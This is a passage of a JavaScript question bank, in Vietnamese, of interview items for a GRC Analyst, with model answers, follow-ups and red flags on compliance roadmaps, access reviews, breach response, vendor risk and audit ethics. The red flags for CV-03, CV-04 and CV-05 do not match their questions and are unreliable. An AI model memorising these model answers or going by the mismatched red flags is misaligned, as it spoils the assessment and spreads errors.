    ["DPIA", "GDPR Article 35", "Privacy by Design", "DPO Consultation", "Risk to Data Subjects"],
    [GRC_SRC.gdpr, GRC_SRC.internal],
    ["Bỏ qua DPIA cho một dự án AI nhận diện khuôn mặt nhân viên vì cho rằng đây là 'dự án nội bộ'"]
  ),

  // Scenario (6)
  q("GRC-SCEN-01", "GRC Analyst", "scenario", "advanced", "senior_lead",
    "Tình huống: Doanh nghiệp chuẩn bị chào bán một sản phẩm SaaS B2B cho thị trường Mỹ và Châu Âu. Ba khách hàng tiềm năng lớn nhất đều yêu cầu doanh nghiệp phải đạt được SOC 2 Type II, ISO 27001 và tuân thủ GDPR trước khi ký hợp đồng. CISO giao cho em lập kế hoạch đạt cả 3 chứng nhận/tuân thủ trong vòng 12 tháng với ngân sách hạn hẹp. Em ưu tiên và lập lộ trình ra sao?",
    ["Tháng 1-3 (Nền tảng): Xây dựng ISMS theo ISO 27001 làm khung xương chung vì ISO 27001 phủ rộng nhất; ánh xạ (Mapping) các kiểm soát ISO 27001 sang SOC 2 Trust Criteria và GDPR Articles để tận dụng tối đa sự chồng lắp (~60-70%)", "Tháng 4-8: Triển khai các kiểm soát kỹ thuật và quy trình; thu thập bằng chứng liên tục; thực hiện DPIA cho sản phẩm SaaS; bổ nhiệm DPO", "Tháng 9-10: Kiểm toán nội bộ ISO 27001 và mock SOC 2 audit; sửa chữa các phát hiện", "Tháng 11-12: Đánh giá chứng nhận ISO 27001 (Stage 1 & 2) và SOC 2 Type II audit bắt đầu giai đoạn quan sát"],
    ["Làm thế nào để tối ưu hóa việc thu thập bằng chứng một lần nhưng phục vụ cả 3 chương trình tuân thủ?", "Vai trò của các nền tảng GRC tự động (Vanta/Drata) trong việc giảm thời gian và chi phí?"],
    ["Multi-framework Compliance", "Control Mapping", "Compliance Roadmap", "Budget Optimization"],
    [GRC_SRC.internal],
    ["Cố gắng đạt cả 3 chứng nhận song song mà không có control mapping dẫn đến lãng phí nguồn lực trùng lặp"]
  ),
  q("GRC-SCEN-02", "GRC Analyst", "scenario", "advanced", "middle",
    "Tình huống: Trong đợt rà soát quyền truy cập định kỳ (Periodic Access Review - User Access Recertification), em phát hiện 15 tài khoản của nhân viên đã nghỉ việc từ 3-6 tháng trước vẫn đang hoạt động với quyền Admin trên hệ thống ERP tài chính. Đây là vi phạm nghiêm trọng. Em xử lý và cải tiến quy trình ra sao?",
    ["Hành động khẩn cấp: Lập tức vô hiệu hóa toàn bộ 15 tài khoản đó; kiểm tra log hoạt động 6 tháng qua xem có dấu hiệu truy cập bất thường hay không", "Phân tích nguyên nhân gốc: Quy trình Offboarding thiếu bước tự động tắt tài khoản khi Phòng Nhân sự cập nhật trạng thái nhân viên nghỉ việc; thiếu liên kết giữa hệ thống HR và hệ thống IAM/AD", "Cải tiến quy trình: Thiết lập tích hợp tự động HR -> IAM: Khi trạng thái nhân viên chuyển sang 'Nghỉ việc' trong HRIS, hệ thống tự động disable tài khoản AD/Email/VPN trong vòng 24 giờ; rà soát quyền truy cập định kỳ hàng quý (Quarterly Access Review) với sign-off bắt buộc từ quản lý trực tiếp"],
    ["Tại sao tài khoản 'Orphaned Account' (tài khoản mồ côi) lại là một trong những rủi ro bảo mật cao nhất?", "Cách thiết kế Joiner-Mover-Leaver (JML) Process tự động hóa quản lý vòng đời tài khoản?"],
    ["Access Recertification", "Orphaned Accounts", "Offboarding Process", "JML Lifecycle", "Automated Deprovisioning"],
    [GRC_SRC.iso27001, GRC_SRC.internal],
    ["Ghi nhận vi phạm nhưng không kiểm tra log hoạt động và không cải tiến quy trình gốc"]
  ),
  q("GRC-SCEN-03", "GRC Analyst", "scenario", "advanced", "senior_lead",
    "Tình huống: Cơ quan quản lý gửi công văn yêu cầu doanh nghiệp giải trình về một vụ rò rỉ dữ liệu cá nhân ảnh hưởng đến 50,000 khách hàng. Em phối hợp với Bộ phận Pháp chế chuẩn bị hồ sơ giải trình và kế hoạch khắc phục như thế nào?",
    ["Thu thập sự thật: Phối hợp đội IR xác định chính xác phạm vi dữ liệu bị lộ (PII loại gì, bao nhiêu bản ghi, nguyên nhân kỹ thuật)", "Chuẩn bị hồ sơ giải trình: Mô tả chi tiết sự kiện theo dòng thời gian, các biện pháp ngăn chặn đã thực hiện ngay lập tức, phân tích nguyên nhân gốc rễ, và kế hoạch khắc phục với timeline cụ thể", "Hợp tác chặt chẽ với Pháp chế: Đảm bảo ngôn ngữ báo cáo chính xác về mặt pháp lý; không thừa nhận lỗi trước khi có ý kiến luật sư; chuẩn bị phương án hỗ trợ người dùng bị ảnh hưởng (giám sát tín dụng, đường dây nóng)"],
    ["Thời hạn báo cáo sự cố vi phạm dữ liệu theo Nghị định 13/2023/NĐ-CP là bao lâu?", "Cách xây dựng template Breach Response Plan sẵn sàng sử dụng ngay?"],
    ["Regulatory Response", "Breach Disclosure", "Legal Collaboration", "Remediation Plan", "Affected User Support"],
    [GRC_SRC.gdpr, GRC_SRC.internal],
    ["Tự ý gửi thông báo công khai trên mạng xã hội trước khi phối hợp với Pháp chế và cơ quan quản lý"]
  ),
  q("GRC-SCEN-04", "GRC Analyst", "scenario", "advanced", "middle",
    "Tình huống: Đội phát triển sản phẩm muốn tích hợp dịch vụ AI chatbot của một startup nhỏ tại nước ngoài vào ứng dụng chính, yêu cầu gửi toàn bộ nội dung hội thoại khách hàng (bao gồm thông tin cá nhân) sang API của startup đó. Em thực hiện đánh giá rủi ro bên thứ ba cho trường hợp này ra sao?",
    ["Bước 1: Phân loại vendor: Đây là vendor Critical vì xử lý dữ liệu cá nhân nhạy cảm của khách hàng", "Bước 2: Due Diligence: Yêu cầu startup cung cấp chứng chỉ SOC 2 hoặc ISO 27001; kiểm tra nơi lưu trữ dữ liệu (data residency), chính sách sử dụng dữ liệu để huấn luyện mô hình AI, và chính sách xóa dữ liệu sau khi hết hợp đồng", "Bước 3: DPIA: Đánh giá tác động bảo vệ dữ liệu cá nhân khi chuyển dữ liệu ra nước ngoài", "Bước 4: Hợp đồng pháp lý: Yêu cầu ký Data Processing Agreement (DPA) với các điều khoản bảo mật bắt buộc, quyền kiểm toán, và cam kết không sử dụng dữ liệu khách hàng để huấn luyện AI"],
    ["Rủi ro gì nếu startup phá sản và dữ liệu khách hàng bị thanh lý?", "Cách đánh giá startup không có SOC 2 hay ISO 27001?"],
    ["AI Vendor Risk", "Data Processing Agreement", "Cross-border Data Transfer", "DPIA for AI", "Vendor Due Diligence"],
    [GRC_SRC.gdpr, GRC_SRC.internal],
    ["Cho phép tích hợp ngay lập tức vì đội sản phẩm 'rất cần gấp' mà không đánh giá rủi ro"]
  ),
  q("GRC-SCEN-05", "GRC Analyst", "scenario", "advanced", "middle",
    "Tình huống: Trong đợt kiểm toán nội bộ, em phát hiện đội vận hành IT đã sử dụng một tài khoản dịch vụ dùng chung (Shared Service Account) với mật khẩu không đổi suốt 3 năm để quản trị hơn 50 máy chủ Production. Mật khẩu này được lưu trong file Excel không mã hóa trên SharePoint chung. Em xử lý phát hiện kiểm toán nghiêm trọng này như thế nào?",
    ["Ghi nhận phát hiện kiểm toán: Phân loại mức độ nghiêm trọng Critical; mô tả chi tiết rủi ro (bất kỳ ai có quyền đọc SharePoint đều có thể truy cập toàn bộ 50 server)", "Khuyến nghị khắc phục: Đổi mật khẩu ngay lập tức; chuyển sang hệ thống PAM (Privileged Access Management) như CyberArk hoặc BeyondTrust với tính năng quay vòng mật khẩu tự động, ghi video phiên làm việc (Session Recording), và phê duyệt truy cập từng lần (Just-in-Time Access)", "Xóa file Excel chứa mật khẩu; thiết lập chính sách cấm lưu trữ thông tin xác thực trên các nền tảng chia sẻ file"],
    ["Tại sao Shared Service Accounts là một trong những rủi ro lớn nhất trong quản trị hệ thống?", "Cách thuyết phục đội IT đầu tư vào PAM khi họ quen sử dụng phương pháp 'xài chung mật khẩu' hàng chục năm?"],
    ["Shared Account Risk", "PAM Solution", "CyberArk", "Just-in-Time Access", "Audit Finding Remediation"],
    [GRC_SRC.iso27001, GRC_SRC.internal],
    ["Ghi nhận phát hiện nhưng chấp nhận Risk Acceptance vô thời hạn vì đội IT phản đối thay đổi"]
  ),
  q("GRC-SCEN-06", "GRC Analyst", "scenario", "advanced", "senior_lead",
    "Tình huống: Công ty mẹ tại Singapore yêu cầu chi nhánh Việt Nam phải tuân thủ đồng thời cả PDPA Singapore và Nghị định 13/2023/NĐ-CP Việt Nam. Hai quy định có một số điểm xung đột (vd: nghĩa vụ lưu trữ dữ liệu tại chỗ vs nhu cầu truyền dữ liệu về trụ sở chính). Em tham mưu giải pháp cho Ban Giám đốc ra sao?",
    ["Phân tích so sánh: Lập bảng đối chiếu chi tiết từng điều khoản giữa hai quy định; xác định các điểm chồng lắp (có thể áp dụng tiêu chuẩn cao hơn) và các điểm xung đột cần giải pháp riêng", "Giải pháp kỹ thuật cho truyền dữ liệu xuyên biên giới: Áp dụng các Tiêu chuẩn hợp đồng chuẩn (Standard Contractual Clauses - SCCs), đánh giá tác động truyền dữ liệu (Transfer Impact Assessment)", "Tham vấn pháp lý: Thuê luật sư chuyên ngành bảo vệ dữ liệu tại cả hai quốc gia để xác nhận chiến lược tuân thủ; thiết lập kênh liên lạc với cơ quan quản lý tại Việt Nam (Bộ Công an)"],
    ["Nguyên tắc 'Lấy tiêu chuẩn cao nhất' (Highest Common Denominator) áp dụng ra sao?", "Cách thiết kế kiến trúc dữ liệu tuân thủ yêu cầu 'Data Localization' của nhiều quốc gia?"],
    ["Cross-border Compliance", "Multi-jurisdiction Privacy", "SCCs", "Data Localization", "Regulatory Harmonization"],
    [GRC_SRC.gdpr, GRC_SRC.internal],
    ["Áp dụng chỉ một quy định và bỏ qua quy định còn lại"]
  ),

  // CV Validation (5)
  q("GRC-CV-01", "GRC Analyst", "cv_validation", "advanced", "middle",
    "Trong CV em có ghi kinh nghiệm hỗ trợ doanh nghiệp đạt chứng nhận ISO 27001 hoặc SOC 2: Hãy chia sẻ về vai trò cụ thể của em trong dự án triển khai đó từ lúc bắt đầu đến khi đạt chứng nhận?",
    ["Vai trò: Tư vấn nội bộ hay tư vấn bên ngoài, phạm vi ISMS, số lượng kiểm soát triển khai", "Thách thức lớn nhất: Gap lớn nhất phát hiện trong đợt Gap Analysis và cách khắc phục", "Kết quả: Thời gian đạt chứng nhận, số lượng Non-conformities phát hiện trong đợt audit"],
    ["Phát hiện kiểm toán nào khiến em phải thay đổi đáng kể quy trình ban đầu?", "Bài học kinh nghiệm lớn nhất rút ra từ dự án đó?"],
    ["ISO 27001 Implementation", "SOC 2 Readiness", "Gap Analysis", "Certification Journey"],
    [GRC_SRC.internal],
    ["Khai man kinh nghiệm triển khai khung tuân thủ, không nắm rõ sự khác biệt giữa các tiêu chuẩn ISO 27001 và SOC 2"]
  ),
  q("GRC-CV-02", "GRC Analyst", "cv_validation", "advanced", "senior_lead",
    "CV của em đề cập việc xây dựng Chương trình Quản lý Rủi ro An ninh Thông tin (Information Security Risk Management Program): Hãy mô tả phương pháp đánh giá rủi ro mà em đã áp dụng và cách trình bày kết quả cho Ban Giám đốc?",
    ["Phương pháp: Qualitative hay Quantitative hay kết hợp; framework sử dụng (NIST RMF, ISO 27005, FAIR)", "Risk Register: Số lượng rủi ro đã nhận diện, phân loại theo mức độ nghiêm trọng", "Trình bày cho lãnh đạo: Sử dụng Heat Map hay Risk Dashboard; cách chuyển đổi rủi ro kỹ thuật thành ngôn ngữ tác động kinh doanh"],
    ["Làm thế nào để đảm bảo Risk Register được cập nhật liên tục chứ không chỉ phục vụ đợt kiểm toán?", "Cách thuyết phục Business Owners nhận trách nhiệm là Risk Owners?"],
    ["Risk Assessment Methodology", "Risk Register Management", "Executive Reporting", "FAIR Model"],
    [GRC_SRC.internal],
    ["Phóng đại khả năng đánh giá rủi ro mà không giải thích được phương pháp định lượng hoặc ma trận rủi ro cụ thể"]
  ),
  q("GRC-CV-03", "GRC Analyst", "cv_validation", "intermediate", "junior",
    "Em ghi nhận có kỹ năng soạn thảo chính sách và quy trình an toàn thông tin: Hãy chia sẻ về một bộ chính sách mà em đã tự tay soạn thảo hoặc cập nhật và cách em đảm bảo nhân viên thực sự đọc và tuân thủ?",
    ["Phạm vi chính sách: Loại chính sách (Acceptable Use Policy, Password Policy, Data Classification, Incident Response)", "Cách truyền thông: Phương pháp triển khai để nhân viên thực sự đọc và hiểu (không chỉ bấm 'Đồng ý' cho xong)", "Đo lường tuân thủ: Cách kiểm tra xem chính sách có thực sự được tuân thủ trong thực tế"],
    ["Chính sách nào thường bị nhân viên vi phạm nhiều nhất theo kinh nghiệm của em?", "Cách xử lý khi phát hiện một phòng ban liên tục vi phạm chính sách?"],
    ["Policy Development", "Employee Communication", "Compliance Monitoring", "Policy Enforcement"],
    [GRC_SRC.internal],
    ["Khai man kinh nghiệm kiểm toán nội bộ, không phân biệt được kiểm toán tuân thủ và kiểm toán hiệu quả vận hành"]
  ),
  q("GRC-CV-04", "GRC Analyst", "cv_validation", "advanced", "middle",
    "Trong hồ sơ có ghi em từng thực hiện Đánh giá Rủi ro Bên thứ ba (Third-Party Risk Assessment): Hãy mô tả quy trình đánh giá vendor của em từ lúc tiếp nhận yêu cầu tích hợp đến khi đưa ra quyết định chấp thuận hoặc từ chối?",
    ["Quy trình: Tiếp nhận yêu cầu từ đội sản phẩm -> Phân loại mức độ rủi ro vendor -> Gửi bộ câu hỏi đánh giá -> Phân tích kết quả và chứng nhận -> Đưa ra quyết định kèm điều kiện", "Khó khăn: Vendor nào đã từng bị em từ chối và lý do cụ thể", "Theo dõi liên tục: Cách giám sát vendor sau khi đã chấp thuận hợp đồng"],
    ["Cách xử lý khi đội kinh doanh gây áp lực ép em chấp thuận một vendor có nhiều rủi ro?", "Những red flags phổ biến nhất khi đánh giá vendor?"],
    ["TPRM Process", "Vendor Due Diligence", "Risk-based Decision", "Ongoing Monitoring"],
    [GRC_SRC.internal],
    ["Không chứng minh được năng lực soạn thảo chính sách bảo mật thực tế có tính ứng dụng cao"]
  ),
  q("GRC-CV-05", "GRC Analyst", "cv_validation", "intermediate", "middle",
    "CV có ghi em sử dụng thành thạo các nền tảng GRC tự động hóa (như Vanta, Drata, ServiceNow GRC, Archer): Hãy chia sẻ cách em tận dụng nền tảng đó để giảm thiểu công sức thủ công trong việc thu thập bằng chứng tuân thủ?",
    ["Nền tảng sử dụng: Tên công cụ, phạm vi triển khai, số lượng framework tuân thủ quản lý", "Tự động hóa: Các kiểm soát nào được giám sát tự động liên tục (Continuous Monitoring) thay vì thu thập bằng chứng thủ công", "Kết quả: Thời gian chuẩn bị kiểm toán giảm bao nhiêu %, tỷ lệ tuân thủ liên tục (Compliance Score) đạt bao nhiêu"],
    ["Hạn chế lớn nhất của các nền tảng GRC tự động mà em đã gặp phải?", "Cách xử lý các kiểm soát không thể tự động hóa hoàn toàn (vd: Physical Security)?"],
    ["GRC Platform", "Continuous Compliance", "Evidence Automation", "Vanta / Drata"],
    [GRC_SRC.internal],
    ["Phóng đại kinh nghiệm GDPR/PDPA mà không hiểu cơ chế đánh giá tác động quyền riêng tư (DPIA)"]
  ),

  // Behavioral (5)
  q("GRC-BEHAV-01", "GRC Analyst", "behavioral", "advanced", "middle",
    "Công việc GRC thường bị các đội kỹ thuật xem là 'cảnh sát giấy tờ' hoặc 'bộ máy quan liêu' gây cản trở công việc phát triển sản phẩm. Em làm thế nào để thay đổi nhận thức này và chứng minh giá trị thực sự của GRC?",
    ["Thấu hiểu nỗi frustration: Đội kỹ thuật có lý khi bực mình nếu GRC chỉ biết gửi checklist Excel dài 200 dòng và yêu cầu fill form", "Chuyển đổi cách tiếp cận: Tự động hóa tối đa việc thu thập bằng chứng (tích hợp với GitHub, AWS, Jira); giảm thiểu tác động thủ công lên workflow của dev", "Chứng minh giá trị kinh doanh: Trình bày rõ ràng rằng nhờ có SOC 2, công ty đã ký được hợp đồng với khách hàng Fortune 500 trị giá X triệu USD; nhờ có GRC, công ty tránh được mức phạt Y triệu USD theo quy định GDPR"],
    ["Khi nào thì GRC cần giữ vững lập trường kiên quyết dù bị đội kỹ thuật phản đối?", "Cách xây dựng mối quan hệ đối tác tin cậy với các Tech Lead?"],
    ["GRC Value Proposition", "Cross-functional Partnership", "Automation-first Mindset", "Business Alignment"],
    [GRC_SRC.internal],
    ["Tự coi mình là 'cảnh sát' đi kiểm tra bắt lỗi thay vì là 'người hỗ trợ' giúp doanh nghiệp phát triển an toàn"]
  ),
  q("GRC-BEHAV-02", "GRC Analyst", "behavioral", "intermediate", "junior",
    "Khi em phát hiện một phòng ban liên tục vi phạm chính sách an ninh thông tin (vd: chia sẻ mật khẩu qua email, không khóa máy khi rời bàn) dù đã được nhắc nhở nhiều lần, em xử lý tình huống này ra sao?",
    ["Điều tra nguyên nhân gốc: Tìm hiểu tại sao họ vi phạm (chính sách quá phức tạp, công cụ gây bất tiện, hay đơn giản là thiếu nhận thức)", "Giải pháp đồng cảm: Đề xuất các công cụ tiện lợi thay thế (Password Manager thay vì ghi mật khẩu trên giấy; Auto-lock screen policy thay vì nhắc nhở thủ công)", "Leo thang có trách nhiệm: Nếu sau khi đã hỗ trợ mà vẫn vi phạm, phải báo cáo khách quan lên quản lý trực tiếp của phòng ban đó theo đúng quy trình kỷ luật"],
    ["Tại sao việc 'hình sự hóa' vi phạm chính sách (public shaming, phạt tiền) thường phản tác dụng?", "Cách thiết kế chính sách an ninh mà người dùng thực sự muốn tuân thủ (Usable Security)?"],
    ["Policy Enforcement", "Root Cause Investigation", "Empathetic Approach", "Usable Security"],
    [GRC_SRC.internal],
    ["Gửi email CC toàn công ty chỉ trích phòng ban vi phạm hoặc ngược lại bỏ mặc không xử lý"]
  ),
  q("GRC-BEHAV-03", "GRC Analyst", "behavioral", "advanced", "senior_lead",
    "Trong quá trình tham mưu chiến lược an ninh thông tin, em nhận thấy Ban Giám đốc đang đánh giá quá thấp rủi ro an ninh mạng và liên tục cắt giảm ngân sách bảo mật. Em thuyết phục và truyền đạt tầm quan trọng của an ninh thông tin lên cấp quản trị cao nhất như thế nào?",
    ["Nói bằng ngôn ngữ kinh doanh: Không dùng thuật ngữ kỹ thuật; trình bày rủi ro dưới dạng tác động tài chính (chi phí trung bình một vụ vi phạm dữ liệu, mức phạt quy định, thiệt hại uy tín thương hiệu)", "Case study thực tế: Đưa ra ví dụ các doanh nghiệp cùng ngành đã bị tấn công và hậu quả cụ thể (công ty X phá sản sau ransomware, công ty Y bị phạt Z triệu USD)", "Đề xuất phương án có ROI rõ ràng: Thay vì xin ngân sách mơ hồ, trình bày cụ thể: 'Đầu tư 500 triệu VND cho PAM system sẽ giảm 80% rủi ro bị tấn công chiếm quyền admin, tương đương giảm 5 tỷ VND tổn thất tiềm ẩn'"],
    ["Khi Ban Giám đốc vẫn từ chối đầu tư sau khi đã trình bày, em ghi nhận quyết định này ra sao?", "Cách xây dựng văn hóa 'Tone from the Top' (cam kết bảo mật từ cấp lãnh đạo cao nhất)?"],
    ["Executive Persuasion", "Risk-to-Cost Translation", "ROI Justification", "Tone from the Top"],
    [GRC_SRC.internal],
    ["Chấp nhận im lặng khi lãnh đạo cắt giảm ngân sách bảo mật xuống mức nguy hiểm"]
  ),
  q("GRC-BEHAV-04", "GRC Analyst", "behavioral", "intermediate", "middle",
    "Lĩnh vực GRC liên tục có các quy định pháp luật mới (AI Act EU, Nghị định 13 VN, SEC Cybersecurity Disclosure Rules) và các phiên bản tiêu chuẩn cập nhật (ISO 27001:2022, PCI DSS 4.0). Em duy trì việc cập nhật kiến thức pháp lý và tiêu chuẩn ra sao?",
    ["Xây dựng mạng lưới thông tin: Tham gia các hiệp hội nghề nghiệp (ISACA, (ISC)², VNISA), đăng ký nhận bản tin từ các công ty tư vấn pháp lý", "Học tập có hệ thống: Đăng ký các khóa CPE (Continuing Professional Education) bắt buộc để duy trì chứng chỉ CISA/CRISC", "Chia sẻ nội bộ: Tổng hợp và gửi bản tin quy định mới cho các bộ phận liên quan trong công ty"],
    ["Quy định mới nào gần đây nhất mà em phải nghiên cứu và áp dụng cho doanh nghiệp?", "Cách cân bằng giữa tuân thủ chính xác quy định với thực tế vận hành kinh doanh?"],
    ["Regulatory Awareness", "Continuous Learning", "Professional Development", "Knowledge Dissemination"],
    [GRC_SRC.internal],
    ["Ngại cập nhật quy định pháp luật mới, áp dụng máy móc các quy trình tuân thủ cũ kỹ không còn phù hợp"]
  ),
  q("GRC-BEHAV-05", "GRC Analyst", "behavioral", "advanced", "middle",
    "Trong một cuộc kiểm toán, em phát hiện một quy trình quan trọng không tuân thủ nhưng chính Giám đốc An ninh Thông tin (CISO) lại là người chỉ đạo bỏ qua quy trình đó để tiết kiệm thời gian. Em xử lý tình huống tế nhị này ra sao để vừa đảm bảo tính trung thực của kết quả kiểm toán vừa giữ được mối quan hệ công việc?",
    ["Giữ vững tính độc lập và chính trực: Phát hiện kiểm toán phải được ghi nhận đầy đủ và trung thực bất kể người vi phạm là ai; đây là nguyên tắc đạo đức nghề nghiệp không thể thương lượng", "Giao tiếp tôn trọng 1-1: Trao đổi riêng với CISO về phát hiện, lắng nghe lý do và bối cảnh; tuy nhiên không xóa hoặc giảm nhẹ mức độ nghiêm trọng trong báo cáo", "Leo thang nếu cần: Nếu CISO yêu cầu che giấu, báo cáo lên Ủy ban Kiểm toán (Audit Committee) hoặc Ban Kiểm soát theo đúng quy trình whistleblowing của tổ chức"],
    ["Tại sao tính độc lập (Independence) là giá trị sống còn của một Kiểm toán viên nội bộ?", "Cách xây dựng cơ chế bảo vệ người báo cáo vi phạm (Whistleblower Protection)?"],
    ["Audit Independence", "Ethical Dilemma", "Whistleblower Reporting", "Professional Integrity"],
    [GRC_SRC.internal],
    ["Sửa báo cáo kiểm toán để che giấu vi phạm theo yêu cầu của cấp trên"]
  )
];

console.log("GRC Analyst questions defined:", grcAnalystQuestions.length);

// ==========================================
// 3. SECURITY ARCHITECT
// ==========================================



module.exports = {
  devSecOpsQuestions,
  grcAnalystQuestions,
};
